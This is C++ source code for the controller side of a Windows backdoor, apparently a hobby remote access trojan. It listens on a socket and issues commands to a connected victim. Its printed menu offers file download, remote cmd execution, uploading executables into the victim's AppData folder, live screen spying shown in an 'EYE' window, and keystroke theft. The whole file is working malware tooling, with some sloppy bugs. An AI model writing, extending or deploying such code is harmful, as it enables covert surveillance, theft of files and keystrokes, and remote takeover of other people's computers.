#include<winsock.h>
#include <iostream>
#include <windows.h>
using namespace std;
SOCKET we_socket;     
sockaddr_in we_addr_info; //创建socket对象 

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}
void initialization() {
	WSADATA wsd;         //定义WSADATA对象
	WSAStartup(MAKEWORD(2, 2), &wsd);
	we_addr_info.sin_family = AF_INET;             //设置服务器地址家族
	we_addr_info.sin_port = htons(6369);           //设置服务器端口号
	we_addr_info.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	int len = sizeof(we_addr_info);
	we_socket = socket(AF_INET, SOCK_STREAM, 0);
	int i = ::bind(we_socket, (sockaddr*)&we_addr_info, len);    //把名字和套接字绑定
	if (i!=0){
		printf("WSAStartup failed: %d\n", WSAGetLastError());
	}
	listen(we_socket, 0);
	we_socket=accept(we_socket, (sockaddr*)&we_socket, &len); 
	if (we_socket>0){
		std::cout<<"new connect:"<<inet_ntoa(we_addr_info.sin_addr)<<std::endl;
	}
}
bool recvFile(SOCKET s){
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	if (buffer == NULL)
	{
		buffer = new char[bufSize];
	}
	char *fileName=(char*)"C:\\Users\\Administrator\\Desktop\\recv_file_back.door";
	FILE* write = fopen(fileName, "wb");
	int nCount;
	do{
		nCount = recv(s, buffer, bufSize, 0);
		fwrite(buffer,nCount, 1, write);
	}while(nCount>=bufSize);//如果不成立就退出

	fclose(write);
	send(we_socket, "ok", 4, 0);
	std::cout << "save file success! Filename-------->"<<fileName << std::endl;
	return true;
}
bool uploadFile(SOCKET s, char* fileName){
	char upload_file_name[128]={0};
	if(fileName[0]=*"$"){
		for(int i=0;i<sizeof((std::string)fileName)+2;i++)
		{upload_file_name[i]=fileName[i+1];}
		std::cout<<"upload file>>>>>"<<upload_file_name<<std::endl;
	}
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	FILE* read = fopen(upload_file_name, "rb");
	fseek(read, 0, SEEK_END);	//将文件位置指针移动到最后
	bufSize = ftell(read);	//ftell(FILE *stream)：返回给定流stream的当前文件位置，获取当前位置相对文件首的位移，位移值等于文件所含字节数
	fseek(read, 0, SEEK_SET);	//将文件位置指针移动到开头
	buffer= new char[bufSize];
	int nCount;
	int ret =0;
	//#G:\github_clone\FL\c++door\1.png
	while ((nCount = fread(buffer, 1, bufSize, read)) > 0){
		ret=send(s, buffer, nCount, 0);
		cout<<buffer<<endl;
	}
	fclose(read);
	std::cout << "send file success!"<<" Byte:"<<ret << std::endl;
	return true;
}

void isee(SOCKET s,BITMAPINFO bi_see,int nWidth,int nHeight,HDC hdc_see,BYTE* bBits){

	MSG msg = { 0 };
	while (msg.message != WM_QUIT)
	{
		if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		else
		{
			send(s, "1", 2, 0);
			BITMAPINFO bInfo;
			ZeroMemory(&bInfo, sizeof(BITMAPINFO));
			bInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
			bInfo.bmiHeader.biBitCount = 24;
			bInfo.bmiHeader.biCompression = BI_RGB;
			bInfo.bmiHeader.biPlanes = 1;
			bInfo.bmiHeader.biWidth = nWidth;
			bInfo.bmiHeader.biHeight = nHeight;
			int len =  nWidth*nHeight*3;
			cout<<"len is--->"<<len<<endl;
			recv(s, (char*)bBits, len, 0);
			SetStretchBltMode(hdc_see, HALFTONE);
			StretchDIBits(hdc_see, 0, 0, nWidth/2, nHeight/2, 0, 0, nWidth, nHeight, bBits, &bInfo, DIB_RGB_COLORS, SRCCOPY);
			Sleep(200);  // Adjust the refresh rate
		}
	}
	send(s, "asdfsae", 10, 0);
	
	
}

int main(){
		cout<<"·····$xx.png--->下载xx.png，需要绝对路径"<<endl;
		cout<<"·····@whoami--->执行cmd命令whoami"<<endl;
		cout<<"·····#xx.exe--->上传xx.exe到用户目录AppData\\Local\\xx.exe"<<endl;
		cout<<"·····!------->窥屏"<<endl;
		cout<<"·····KEY------->键盘窃取"<<endl;
		cout<<"·····&249------>弹窗：249"<<endl;
		char recv_msg[1024],send_msg[1024];
		initialization();
		while (1){
			memset(recv_msg, 0, sizeof(recv_msg));
			memset(send_msg, 0, sizeof(send_msg));
			std::cout<<"          input***";
			std::cin.getline(send_msg,65);
			send(we_socket, send_msg, sizeof(send_msg), 0);
			if(send_msg[0]==*"$"){recvFile(we_socket);}
			if(send_msg[0]==*"#"){uploadFile(we_socket,send_msg);}
			if(send_msg[0]==*"!"){
				//创建窗口
				int xyy[2];
				recv(we_socket, (char*)&xyy, 10, 0);
				cout<<"we send height is"<<xyy[0]<<endl<<"width is"<<xyy[1]<<endl;
				WNDCLASS wc = { 0 };
				wc.lpfnWndProc = WndProc;
				wc.hInstance = GetModuleHandle(NULL);
				wc.lpszClassName = "ScreenCaptureReceiverWindowClass";
				int nWidth = xyy[1];
				int nHeight = xyy[0];
				RegisterClass(&wc);
				HWND EYE_hwnd = CreateWindowEx(0, wc.lpszClassName, "EYE", WS_OVERLAPPEDWINDOW,
					CW_USEDEFAULT, CW_USEDEFAULT, nWidth/2, nHeight/2, NULL, NULL, wc.hInstance, NULL);
				ShowWindow(EYE_hwnd, SW_SHOW);
				//创建位图信息
				BYTE* bBits = nullptr;
				BITMAPINFO bi_see;
				ZeroMemory(&bi_see, sizeof(BITMAPINFO));
				bi_see.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
				bi_see.bmiHeader.biWidth = nWidth;
				bi_see.bmiHeader.biHeight = nHeight;
				bi_see.bmiHeader.biPlanes = 1;
				bi_see.bmiHeader.biBitCount = 24;
				bi_see.bmiHeader.biCompression = BI_RGB;
				bi_see.bmiHeader.biSizeImage = nHeight* nWidth;
				HDC hdc_see = GetDC(EYE_hwnd);
				HBITMAP hBitmap = CreateDIBSection(hdc_see, &bi_see, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
				//消息循环
				isee(we_socket,bi_see,nWidth,nHeight,hdc_see,bBits);
				DeleteObject(hBitmap);
				ReleaseDC(EYE_hwnd, hdc_see);

			}
			recv(we_socket, recv_msg, sizeof(recv_msg), 0); 
			printf("[recv_msg]-->%s\n",recv_msg);
			
			}
		closesocket(we_socket);
		WSACleanup();
	
	return 0;
}
//if (!strcmp(send_msg, "exit"))                     
//如果输入的是exit则断开连接 $G:\github_clone\FL\c++door\1.jpg
//#G:\github_clone\FL\c++door\1.png

